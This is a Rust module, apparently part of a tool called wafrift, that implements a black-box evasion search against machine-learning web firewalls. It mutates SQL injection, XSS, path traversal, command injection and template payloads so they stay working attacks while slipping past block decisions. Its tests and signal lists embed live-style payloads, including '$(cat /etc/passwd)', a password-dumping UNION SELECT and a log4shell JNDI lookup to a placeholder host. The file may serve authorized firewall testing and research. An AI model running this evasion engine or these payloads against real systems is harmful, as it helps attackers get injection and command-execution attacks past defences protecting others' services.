//! Constrained black-box evasion of **ML-WAFs**.
//!
//! Regex-WAFs are decompiled (P1) and solved (P2). The next-generation
//! threat is a learned classifier — Cloudflare/AWS/Fastly ML-WAFs —
//! where there is no rule to learn and no normalization to mismatch.
//! The paradigm-correct tool there is a *decision-based boundary
//! attack* (HopSkipJump-family): perturb a blocked attack toward the
//! decision boundary using only the WAF's block/allow answers.
//!
//! The crucial twist nobody else has: the perturbation must keep the
//! input a **working attack**. That is a hard manifold constraint, and
//! the projection-onto-feasible operator *is wafrift's soundness
//! oracle*. Every candidate is projected back onto the executable-
//! attack manifold (rejected if it stops being an attack) — so a
//! "bypass" can never be won by mutating the payload into something
//! inert. Anti-rig is structural: leaving the manifold is not a
//! success, it is a discarded sample.

use crate::error::Result;
use wafrift_types::Request;

/// An ML-WAF: a decision, and optionally a continuous score that lets
/// the boundary attack descend instead of blind-search.
pub trait MlWaf {
    /// `true` ⇒ the request is blocked.
    fn blocks(&mut self, req: &Request) -> Result<bool>;
    /// Optional anomaly score (higher = more likely blocked). `None`
    /// ⇒ decision-only WAF (the realistic black-box threat model).
    fn score(&mut self, _req: &Request) -> Result<Option<f64>> {
        Ok(None)
    }
}

/// Deterministic SplitMix64 (reproducible adversarial search).
struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 = self.0.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.0;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }
    fn below(&mut self, n: usize) -> usize {
        (self.next() % n as u64) as usize
    }
}

/// Attack-class HINT used ONLY to pick which semantics-preserving mutation
/// operators `propose` offers. This is deliberately NOT the canonical payload
/// classifier (`evolution::PayloadClass::from_payload` / the per-class
/// oracles): wafmodel sits below those layers, and this is a tiny local
/// operator-selection heuristic, never a label that is persisted or reported.
/// The manifold ([`is_attack_payload`]) remains the hard correctness gate — a
/// wrong hint only costs a discarded proposal, never a false bypass.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum MutClass {
    Sql,
    Xss,
    Path,
    Cmd,
    Template,
    Generic,
}

/// Pick the mutation-class hint from the bytes. Priority order is chosen so
/// the most operator-DISTINCT class wins: `Cmd` first because case-flipping a
/// Linux command BREAKS it (commands are case-sensitive: `LS` ≠ `ls`), so a
/// command payload must steer clear of the case-flip operator the other
/// classes rely on. Cmd signals are kept distinctive (`$(`, backtick,
/// `/bin/`, `${IFS}`, `system(`/`exec(`) rather than the `;`/`|` that also
/// appear in SQL, to avoid stealing SQL payloads into the case-flip-free set.
fn mut_class(input: &[u8]) -> MutClass {
    let s = String::from_utf8_lossy(input).to_ascii_lowercase();
    let has = |needles: &[&str]| needles.iter().any(|n| s.contains(n));
    if has(&["$(", "${ifs}", "/bin/", "`", "system(", "exec(", "popen("]) {
        MutClass::Cmd
    } else if has(&["<script", "onerror", "onload", "javascript:", "alert(", "<svg", "<img"]) {
        MutClass::Xss
    } else if has(&["select", "union", " or ", " and ", "sleep(", "/**/", "'--", "'#"]) {
        MutClass::Sql
    } else if has(&["../", "..\\", "/etc/", "%2e%2e", "..%2f", "..%5c", "c:\\", "\\\\"]) {
        MutClass::Path
    } else if s.contains("${") {
        MutClass::Template
    } else {
        MutClass::Generic
    }
}

/// Flip the case of one ASCII letter in `v` (semantics-preserving for SQL
/// keywords, HTML tag/attribute names, and Windows paths — NOT for Linux
/// commands, which `propose` excludes from this operator).
fn flip_one_ascii_letter(v: &mut [u8], rng: &mut Rng) {
    if v.is_empty() {
        return;
    }
    for _ in 0..4 {
        let i = rng.below(v.len());
        if v[i].is_ascii_alphabetic() {
            v[i] ^= 0x20;
            break;
        }
    }
}

/// Insert `frag` at a random byte offset in `v`.
fn insert_fragment(v: &mut Vec<u8>, rng: &mut Rng, frag: &[u8]) {
    let i = if v.is_empty() { 0 } else { rng.below(v.len()) };
    for (k, b) in frag.iter().enumerate() {
        v.insert(i + k, *b);
    }
}

/// Replace one existing ASCII space in `v` with `frag`. No-op (leaves `v`
/// unchanged) when there is no space — the caller's loop simply re-proposes.
fn replace_one_space(v: &mut Vec<u8>, rng: &mut Rng, frag: &[u8]) {
    let spaces: Vec<usize> = v
        .iter()
        .enumerate()
        .filter(|&(_, &b)| b == b' ')
        .map(|(i, _)| i)
        .collect();
    if spaces.is_empty() {
        return;
    }
    let pick = spaces[rng.below(spaces.len())];
    v.splice(pick..=pick, frag.iter().copied());
}

/// Semantics-preserving *proposals* (liberal — validity is enforced by the
/// manifold projection, not by the mutator). The operator set is now
/// CLASS-AWARE: the original implementation only emitted XSS-appropriate
/// edits (case-flip, intra-tag whitespace, HTML comment), so for a SQL / path
/// / command payload most proposals were inert and discarded by the manifold,
/// leaving the boundary search far weaker off-XSS (a likely contributor to the
/// observed XSS-skew in live ML-evasion). Each class now gets edits that keep
/// ITS attack executable:
/// - SQL: `/**/` inline comment + space→`/**/`/tab/newline (all SQL whitespace)
///   + keyword case-flip.
/// - XSS: case-flip + benign intra-tag whitespace + HTML comment (as before).
/// - Path: `/`→`%2f`, `.`→`%2e` percent-encoding + case-flip (Windows paths).
/// - Cmd: space→`${IFS}` + empty-quote insertion — NO case-flip (Linux
///   commands are case-sensitive; flipping would break them).
/// - Template/Generic: case-flip + whitespace.
fn propose(input: &[u8], rng: &mut Rng) -> Vec<u8> {
    if input.is_empty() {
        return input.to_vec();
    }
    let mut v = input.to_vec();
    match mut_class(input) {
        MutClass::Sql => match rng.below(3) {
            0 => insert_fragment(&mut v, rng, b"/**/"),
            1 => {
                // SQL treats `/**/`, tab, newline, and form-feed all as
                // whitespace, so swapping a space for any of them preserves
                // the statement while breaking literal-space WAF signatures.
                let frags: [&[u8]; 4] = [b"/**/", b"\t", b"\n", b"\x0c"];
                let frag = frags[rng.below(frags.len())];
                replace_one_space(&mut v, rng, frag);
            }
            _ => flip_one_ascii_letter(&mut v, rng),
        },
        MutClass::Xss => match rng.below(3) {
            0 => flip_one_ascii_letter(&mut v, rng),
            1 => insert_fragment(&mut v, rng, b" "),
            _ => insert_fragment(&mut v, rng, b"<!---->"),
        },
        MutClass::Path => match rng.below(2) {
            0 => {
                // Percent-encode one `/` or `.` (path normalisers decode it).
                if let Some(i) = v.iter().position(|&b| b == b'/' || b == b'.') {
                    let enc: &[u8] = if v[i] == b'/' { b"%2f" } else { b"%2e" };
                    v.splice(i..=i, enc.iter().copied());
                } else {
                    flip_one_ascii_letter(&mut v, rng);
                }
            }
            _ => flip_one_ascii_letter(&mut v, rng),
        },
        MutClass::Cmd => match rng.below(2) {
            // NO case-flip: Linux commands are case-sensitive.
            0 => replace_one_space(&mut v, rng, b"${IFS}"),
            _ => insert_fragment(&mut v, rng, b"\"\""),
        },
        MutClass::Template | MutClass::Generic => match rng.below(2) {
            0 => flip_one_ascii_letter(&mut v, rng),
            _ => insert_fragment(&mut v, rng, b" "),
        },
    }
    v
}

/// Apply one semantics-preserving structural mutation to `input` under
/// `seed` and return the candidate. Liberal — the caller must enforce the
/// manifold via [`is_attack_payload`] (a mutation that destroys the attack
/// is the caller's to reject). Exposed so the async I/O layer (bench / scan,
/// which own the *live* WAF oracle) can drive a live decision-based boundary
/// attack without re-implementing the mutation operators; [`evade_ml`] is the
/// synchronous, in-process counterpart for callers with a sync oracle.
#[must_use]
pub fn propose_mutation(input: &[u8], seed: u64) -> Vec<u8> {
    let mut rng = Rng(seed);
    propose(input, &mut rng)
}

/// The canonical executable-attack manifold check: does `bytes` still carry
/// at least one live attack signal (SQLi / XSS / path / RCE)? This is the
/// projection-onto-feasible operator — a candidate that fails it is inert
/// (not a bypass, a discarded sample). Single source of truth shared by the
/// strategy router and the bench/scan live boundary attack (§7 DEDUP), so the
/// manifold definition can never drift between the mutation and verification
/// sides.
#[must_use]
pub fn is_attack_payload(bytes: &[u8]) -> bool {
    let s = String::from_utf8_lossy(bytes).to_ascii_lowercase();
    const SIGNALS: &[&str] = &[
        "select",
        "union",
        "or 1",
        "and 1",
        "sleep(",
        "<script",
        "onerror",
        "alert(",
        "javascript:",
        "../",
        "/etc/passwd",
        "eval(",
        "exec(",
        "system(",
        "$(",
        // Path traversal (Windows / UNC / percent-encoded). Dogfooding the
        // live cumulus bench showed ml-evasion skipped these classes because
        // the manifold didn't recognise them as attacks.
        "..\\",
        "c:\\",
        "\\\\",
        "%2e%2e",
        "..%2f",
        "..%5c",
        // Template / expression-language / log4shell injection + SVG-vector XSS.
        "${",
        "<svg",
    ];
    SIGNALS.iter().any(|sig| s.contains(sig))
}

/// Outcome of an ML-WAF evasion search.
#[derive(Debug, Clone)]
pub struct MlEvasion {
    /// The evading input — bypasses the ML-WAF *and* is still an attack.
    pub input: Vec<u8>,
    /// ML-WAF queries spent.
    pub queries: u64,
    /// Candidates rejected by the manifold projection (never counted
    /// as progress — the anti-rig ledger).
    pub off_manifold_rejected: u64,
}

/// Decision-based boundary attack constrained to the executable-attack
/// manifold.
///
/// `is_attack` is the projection-onto-feasible operator (wafrift's
/// soundness oracle): a candidate that is not a working attack is
/// discarded, never accepted to "win". If `score` is available the
/// search descends it (HopSkipJump-style); otherwise it is a
/// manifold-constrained randomized boundary walk with restarts.
///
/// Returns `None` iff no on-manifold input within `budget` queries
/// bypasses the WAF — e.g. an ML-WAF that blocks the *entire* attack
/// manifold (correctly reported, never fabricated).
pub fn evade_ml<W, F, B>(
    start: &[u8],
    waf: &mut W,
    is_attack: &F,
    build: &B,
    budget: u64,
    seed: u64,
) -> Result<Option<MlEvasion>>
where
    W: MlWaf,
    F: Fn(&[u8]) -> bool,
    B: Fn(&[u8]) -> Request,
{
    // The start MUST be on the manifold and blocked, else the search
    // is meaningless (anti-rig: no vacuous "bypass").
    if !is_attack(start) {
        return Ok(None);
    }
    let mut rng = Rng(seed);
    let mut queries = 0u64;
    let mut off = 0u64;

    let start_req = build(start);
    if !waf.blocks(&start_req)? {
        queries += 1;
        // Already passes and is an attack — trivially evading.
        return Ok(Some(MlEvasion {
            input: start.to_vec(),
            queries,
            off_manifold_rejected: 0,
        }));
    }
    queries += 1;

    let mut best = start.to_vec();
    let mut best_score = waf.score(&start_req)?;
    if let Some(s) = best_score {
        queries += 1;
        best_score = Some(s);
    }

    while queries < budget {
        // Restart from `best` (the closest-to-boundary on-manifold
        // point found so far) with a fresh perturbation.
        let cand = propose(&best, &mut rng);
        // Manifold projection: reject anything that is not a working
        // attack. This is the hard constraint — and the anti-rig.
        if !is_attack(&cand) {
            off += 1;
            continue;
        }
        let req = build(&cand);
        let blocked = waf.blocks(&req)?;
        queries += 1;
        if !blocked {
            return Ok(Some(MlEvasion {
                input: cand,
                queries,
                off_manifold_rejected: off,
            }));
        }
        // Still blocked: keep it only if it moved us closer to the
        // boundary (lower score). With no score, accept with a small
        // probability to keep exploring (constrained boundary walk).
        if let Ok(Some(sc)) = waf.score(&req) {
            queries += 1;
            if best_score.is_none_or(|b| sc < b) {
                best = cand;
                best_score = Some(sc);
            }
        } else if rng.below(4) == 0 {
            best = cand;
        }
    }
    Ok(None)
}

#[cfg(test)]
mod attack_manifold_tests {
    use super::{is_attack_payload, propose_mutation};

    #[test]
    fn recognises_core_and_path_traversal_attacks() {
        for atk in [
            "' OR 1=1--",
            "<script>alert(1)</script>",
            "; cat /etc/passwd",
            "C:\\Windows\\system32\\cmd.exe", // drive path (dogfood gap)
            "\\\\attacker\\share\\x",          // UNC path (dogfood gap)
            "..\\..\\..\\boot.ini",            // Windows traversal
            "%2e%2e%2f%2e%2e%2fetc/hosts",     // encoded traversal
            "${jndi:ldap://x/a}",              // log4shell / EL injection
            "<svg onload=alert(1)>",           // SVG-vector XSS
        ] {
            assert!(
                is_attack_payload(atk.as_bytes()),
                "must be recognised as an on-manifold attack: {atk:?}"
            );
        }
    }

    #[test]
    fn rejects_benign_payloads() {
        for benign in ["hello world", "name=John&age=30", "the quick brown fox", ""] {
            assert!(
                !is_attack_payload(benign.as_bytes()),
                "benign payload must be off-manifold: {benign:?}"
            );
        }
    }

    #[test]
    fn propose_mutation_is_deterministic_per_seed() {
        let p = b"' OR 1=1--";
        assert_eq!(
            propose_mutation(p, 7),
            propose_mutation(p, 7),
            "same seed must yield the same mutation"
        );
    }

    #[test]
    fn proposals_stay_on_manifold_per_class() {
        // Class-aware proposer regression: each attack class must keep a strong
        // MAJORITY of proposals ON the executable-attack manifold. Pre-fix the
        // operators were XSS-only, so SQL/cmd/path payloads had most proposals
        // turned inert (HTML-comment / mid-token space) and discarded — gutting
        // the boundary search off-XSS. A regression to XSS-only operators tanks
        // the non-XSS counts and trips this.
        let cases: &[&[u8]] = &[
            b"1 UNION SELECT password FROM users", // SQL
            b"$(cat /etc/passwd)",                 // Cmd
            b"../../../../etc/passwd",             // Path
            b"<script>alert(1)</script>",          // XSS
        ];
        for payload in cases {
            let on = (0..200u64)
                .filter(|&seed| is_attack_payload(&propose_mutation(payload, seed)))
                .count();
            assert!(
                on >= 100,
                "only {on}/200 proposals stayed on-manifold for {:?} — operators not class-appropriate",
                String::from_utf8_lossy(payload)
            );
        }
    }

    #[test]
    fn mut_class_routes_representative_payloads() {
        use super::{MutClass, mut_class};
        assert_eq!(mut_class(b"1 UNION SELECT 1"), MutClass::Sql);
        assert_eq!(mut_class(b"<script>alert(1)</script>"), MutClass::Xss);
        assert_eq!(mut_class(b"../../etc/hosts"), MutClass::Path);
        assert_eq!(mut_class(b"$(id)"), MutClass::Cmd);
        assert_eq!(mut_class(b"${jndi:ldap://x}"), MutClass::Template);
        assert_eq!(mut_class(b"plain text"), MutClass::Generic);
    }

    #[test]
    fn cmd_proposals_never_uppercase_a_command() {
        // Linux commands are case-sensitive (`CAT` != `cat`), so the Cmd
        // operator set must NOT include case-flip — and unlike SQL/XSS/path,
        // the case-insensitive manifold would NOT catch a flipped-and-broken
        // command (it would pass the manifold yet be inert on a real target).
        // Strip the `${IFS}` operator's literal (its only uppercase) and assert
        // no other uppercase letter is ever introduced.
        let p = b"$(cat /etc/passwd)"; // routed to Cmd by `$(`
        for seed in 0..200u64 {
            let c = propose_mutation(p, seed);
            let s = String::from_utf8_lossy(&c).replace("${IFS}", "");
            assert!(
                !s.chars().any(|ch| ch.is_ascii_uppercase()),
                "cmd proposer introduced an uppercase letter (breaks a Linux command): {:?}",
                String::from_utf8_lossy(&c)
            );
        }
    }
}
